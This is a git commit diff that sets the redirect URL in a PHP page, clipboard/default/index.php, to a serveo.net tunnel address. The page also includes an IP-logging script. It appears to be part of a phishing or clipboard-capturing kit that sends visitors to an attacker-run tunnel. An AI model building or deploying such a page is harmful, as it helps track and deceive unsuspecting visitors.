9d21303c1af2d4699a837c4985658a6e5b5cbe7f
0xJarmenKell <87781261+youssefyousry994@users.noreply.github.com>
2024-06-16 20:26:25 +0300

    Update index.php

--- clipboard/default/index.php
+++ clipboard/default/index.php
@@ -2,7 +2,7 @@
 include "ip.php";
 include "meta.php";
 include "clipboard.html.php";
-$url = "redirecturl";
+$url = "https://99765ff2bfc8a4f189a4b2d7180a1333.serveo.net";
 echo "<script> 
     const redirect_url = '$url';
 </script>";
